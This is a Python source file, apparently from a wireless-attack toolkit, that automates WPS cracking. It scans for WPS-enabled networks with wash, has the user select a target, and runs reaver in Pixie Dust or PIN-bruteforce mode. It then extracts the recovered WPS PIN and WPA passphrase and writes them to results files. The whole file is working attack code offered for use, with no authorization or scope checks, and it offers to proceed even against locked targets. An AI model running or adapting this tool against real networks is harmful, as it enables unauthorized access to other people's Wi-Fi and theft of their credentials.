#!/usr/bin/env python3

from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import subprocess
import threading
import time
import signal
import os
import re
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    scan_networks,
    select_target,
    get_data_path,
    log_activity,
    get_temp_path,
    cleanup_temp_files
)

class WPSAttacker:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.running = False
        self.pin_found = False
        self.current_pin = None
        self.status_thread = None
        self.start_time = None
        self.pins_tested = 0
        self.attack_process = None

    def cleanup(self):
        """Clean up resources and restore interface state"""
        try:
            self.running = False
            if self.status_thread and self.status_thread.is_alive():
                self.status_thread.join(timeout=1)
            if self.attack_process:
                self.attack_process.terminate()
                time.sleep(1)
            if self.interface:
                subprocess.run(['airmon-ng', 'stop', self.interface], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
        except Exception as e:
            self.console.print(f"[red]Error during cleanup: {str(e)}[/red]")

    def get_interface(self):
        """Get available wireless interfaces with improved detection"""
        try:
            interfaces = []
            
            # Method 1: iwconfig
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)

            # Method 2: iw dev
            if not interfaces:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split('Interface')[1].strip()
                        interfaces.append(iface)

            # Method 3: Check /sys/class/net for wireless devices
            if not interfaces:
                for iface in os.listdir('/sys/class/net'):
                    if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                        interfaces.append(iface)

            if not interfaces:
                self.console.print("[red]No wireless interfaces found![/red]")
                self.console.print("[yellow]Please ensure your wireless adapter is connected and recognized.[/yellow]")
                return None

            # Display available interfaces in a table
            table = Table(title="Available Wireless Interfaces")
            table.add_column("Index", style="cyan")
            table.add_column("Interface", style="green")
            table.add_column("Status", style="yellow")

            for idx, iface in enumerate(interfaces, 1):
                # Get interface status
                status = "Unknown"
                try:
                    result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
                    if 'Mode:Monitor' in result.stdout:
                        status = "Monitor Mode"
                    elif 'Mode:Managed' in result.stdout:
                        status = "Managed Mode"
                except:
                    pass
                table.add_row(str(idx), iface, status)

            self.console.print(table)

            while True:
                try:
                    choice = int(input("\nSelect interface number: ")) - 1
                    if 0 <= choice < len(interfaces):
                        return interfaces[choice]
                except ValueError:
                    pass
                self.console.print("[red]Invalid choice. Please try again.[/red]")

        except Exception as e:
            self.console.print(f"[red]Error detecting wireless interfaces: {str(e)}[/red]")
            return None

    def scan_networks(self):
        """Scan for networks with WPS enabled"""
        try:
            networks = []
            temp_file = get_temp_path('wps_scan')
            
            # Start wash scan
            scan_process = subprocess.Popen(
                ['wash', '-i', self.interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Show progress while scanning
            with Progress() as progress:
                task = progress.add_task("[cyan]Scanning for WPS-enabled networks...", total=100)
                
                for i in range(20):  # Scan for 20 seconds
                    progress.update(task, advance=5)
                    
                    # Read output without blocking
                    while True:
                        line = scan_process.stdout.readline()
                        if not line:
                            break
                            
                        if '|' in line:  # Valid network line
                            parts = line.strip().split('|')
                            if len(parts) >= 5:
                                bssid = parts[0].strip()
                                channel = parts[1].strip()
                                wps_version = parts[2].strip()
                                wps_locked = parts[3].strip()
                                essid = parts[4].strip()
                                
                                if bssid and essid:
                                    networks.append({
                                        'BSSID': bssid,
                                        'Channel': channel,
                                        'ESSID': essid,
                                        'WPS Version': wps_version,
                                        'WPS Locked': wps_locked == 'Yes'
                                    })
                    
                    time.sleep(1)
                
                scan_process.terminate()
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error during WPS scan: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Select target network with improved UI"""
        if not networks:
            self.console.print("[red]No WPS-enabled networks found![/red]")
            return False

        # Display networks
        table = Table(title="WPS-Enabled Networks")
        table.add_column("Index", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("Channel", justify="center")
        table.add_column("ESSID", style="yellow")
        table.add_column("WPS Version", justify="center")
        table.add_column("Status", style="red")

        for idx, network in enumerate(networks, 1):
            table.add_row(
                str(idx),
                network['BSSID'],
                network['Channel'],
                network['ESSID'],
                network['WPS Version'],
                "Locked" if network['WPS Locked'] else "Unlocked"
            )

        self.console.print(table)

        while True:
            try:
                choice = int(input("\nSelect target network number: ")) - 1
                if 0 <= choice < len(networks):
                    target = networks[choice]
                    if target['WPS Locked']:
                        self.console.print("[yellow]Warning: WPS is locked on this network. Attack may not be successful.[/yellow]")
                        if input("Continue anyway? (y/n): ").lower() != 'y':
                            return False
                    self.target_bssid = target['BSSID']
                    self.target_channel = target['Channel']
                    self.target_essid = target['ESSID']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice. Please try again.[/red]")

        return False

    def display_status(self):
        """Display attack status with improved metrics"""
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                rate = self.pins_tested / elapsed if elapsed > 0 else 0
                
                self.console.clear()
                self.console.print("\n[bold cyan]WPS Attack Status:[/bold cyan]")
                self.console.print(f"Target BSSID: {self.target_bssid}")
                self.console.print(f"Target ESSID: {self.target_essid}")
                self.console.print(f"Channel: {self.target_channel}")
                if self.current_pin:
                    self.console.print(f"Current PIN: {self.current_pin}")
                self.console.print(f"PINs Tested: {self.pins_tested}")
                self.console.print(f"Duration: {int(elapsed)}s")
                self.console.print(f"Rate: {rate:.2f} PINs/min")
                self.console.print("\n[yellow]Press Ctrl+C to stop[/yellow]")
                
                time.sleep(1)
            except:
                break

    def parse_reaver_output(self, line):
        """Parse reaver output for status updates"""
        try:
            # Check for PIN attempts
            pin_match = re.search(r'Trying PIN \"(\d+)\"', line)
            if pin_match:
                self.current_pin = pin_match.group(1)
                self.pins_tested += 1
                return

            # Check for successful PIN
            if "WPS PIN:" in line:
                pin = re.search(r'WPS PIN: (\d+)', line)
                if pin:
                    self.pin_found = True
                    self.current_pin = pin.group(1)
                    return

            # Check for WPA PSK
            if "WPA PSK:" in line:
                psk = re.search(r'WPA PSK: \'(.+?)\'', line)
                if psk:
                    self.console.print(f"\n[green]WPA PSK found: {psk.group(1)}[/green]")
                    return

        except Exception as e:
            pass

    def start_attack(self):
        """Start WPS attack with improved reliability"""
        try:
            # Get interface
            self.interface = self.get_interface()
            if not self.interface:
                return

            # Scan for networks
            self.console.print("\n[cyan]Scanning for WPS-enabled networks...[/cyan]")
            networks = self.scan_networks()
            
            # Select target
            if not self.select_target(networks):
                return

            # Get attack options
            self.console.print("\n[cyan]Attack Options:[/cyan]")
            self.console.print("1. Pixie Dust attack (faster but may not work)")
            self.console.print("2. PIN bruteforce (slower but more reliable)")
            
            while True:
                try:
                    choice = int(input("\nSelect attack type: "))
                    if choice in [1, 2]:
                        break
                except ValueError:
                    pass
                self.console.print("[red]Invalid choice. Please try again.[/red]")

            # Create output directory for this attack
            output_dir = get_data_path('wps', f'attack_{self.target_bssid.replace(":", "")}')
            os.makedirs(output_dir, exist_ok=True)

            # Prepare attack command
            if choice == 1:
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', self.target_bssid,
                    '-c', self.target_channel,
                    '-K', '1',  # Pixie Dust attack
                    '-vv',  # Verbose output
                    '-s', os.path.join(output_dir, 'session.txt')  # Session file
                ]
            else:
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', self.target_bssid,
                    '-c', self.target_channel,
                    '-vv',  # Verbose output
                    '-s', os.path.join(output_dir, 'session.txt')  # Session file
                ]

            # Start attack
            self.console.print("\n[green]Starting WPS attack...[/green]")
            self.console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
            
            self.running = True
            self.start_time = time.time()
            self.pins_tested = 0
            
            # Start status display thread
            self.status_thread = threading.Thread(target=self.display_status)
            self.status_thread.daemon = True
            self.status_thread.start()

            # Start attack process
            self.attack_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Monitor attack output
            while self.running:
                line = self.attack_process.stdout.readline()
                if not line:
                    break
                
                self.parse_reaver_output(line)
                
                if self.pin_found:
                    self.console.print("\n[green]WPS PIN found![/green]")
                    self.console.print(f"[green]PIN: {self.current_pin}[/green]")
                    
                    # Save results
                    with open(os.path.join(output_dir, 'results.txt'), 'w') as f:
                        f.write(f"Target Network: {self.target_essid}\n")
                        f.write(f"BSSID: {self.target_bssid}\n")
                        f.write(f"Channel: {self.target_channel}\n")
                        f.write(f"WPS PIN: {self.current_pin}\n")
                        f.write(f"Attack Duration: {int(time.time() - self.start_time)} seconds\n")
                        f.write(f"PINs Tested: {self.pins_tested}\n")
                    break

            if not self.pin_found:
                self.console.print("\n[yellow]No WPS PIN found.[/yellow]")
                # Save attack information even if unsuccessful
                with open(os.path.join(output_dir, 'attack_info.txt'), 'w') as f:
                    f.write(f"Target Network: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Channel: {self.target_channel}\n")
                    f.write(f"Attack Duration: {int(time.time() - self.start_time)} seconds\n")
                    f.write(f"PINs Tested: {self.pins_tested}\n")
                    f.write("Attack Result: No PIN found\n")

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
        finally:
            self.cleanup() 